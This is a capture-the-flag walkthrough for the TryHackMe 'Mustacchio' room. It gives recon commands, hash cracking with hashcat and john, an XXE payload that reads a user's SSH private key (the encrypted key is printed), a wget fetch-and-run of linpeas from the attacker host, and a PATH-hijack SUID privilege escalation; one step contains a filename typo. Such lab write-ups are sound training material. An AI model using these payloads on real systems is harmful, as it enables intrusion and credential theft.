https://tryhackme.com/room/mustacchio
>IP:10.10.17.215

# RECON
```
nmap -p- -sS 10.10.17.215 -vv   
sudo nmap 10.10.17.215 -sC -sV -p22,80,8765 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 06:03 EDT
Nmap scan report for 10.10.17.215
Host is up (0.077s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

http://10.10.17.215/index.html
![Mustacchio](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Mustacchio/screenshots/2025-04-01 13-02-59.png)

```
ffuf -u http://10.10.17.215/FFUZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -ic -c  
images 
custom 
fonts
```

![Mustacchio](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Mustacchio/screenshots/2025-04-01 13-05-47.png)

## users.bak
```
admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b 
```
```
nth --text "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b" 

SHA-1, HC: 100 JtR: raw-sha1 Summary: Used for checksums.See more
HMAC-SHA1 (key = $salt), HC: 160 JtR: hmac-sha1
Haval-128, JtR: haval-128-4
RIPEMD-128, JtR: ripemd-128
```

```
hashcat -h | grep "SHA"  
    100 | SHA1                                                       | Raw Hash
```
```
hashcat -m 100 '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b' /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```

http://10.10.17.215:8765/
![Mustacchio](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Mustacchio/screenshots/2025-04-01 13-12-22.png)


```
admin:bulldog19  
```

# XXE
![Mustacchio](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Mustacchio/screenshots/2025-04-01 13-27-00.png)

ffuf -u http://10.10.17.215:8765/FFUZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -ic -c  

/auth/dontforget.bak
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>       
```

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

```
ssh2john key > key_hash.txt
```

```
john key_hash.txt --wordlist= /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 
```

urieljames
# LPE
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```

```
wget http://10.23.87.78/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```

## SUID 
```
/home/joe/live_log
```

```
export PATH=/tmp:$PATH
```

```
echo '#!/bin/bash' > /tmp/tail
echo "chmod u+s /bin/bash" >> /tmp/tailcp
chmod +x /tmp/tail
```

```
./home/joe/live_log
/bin/bash -p
```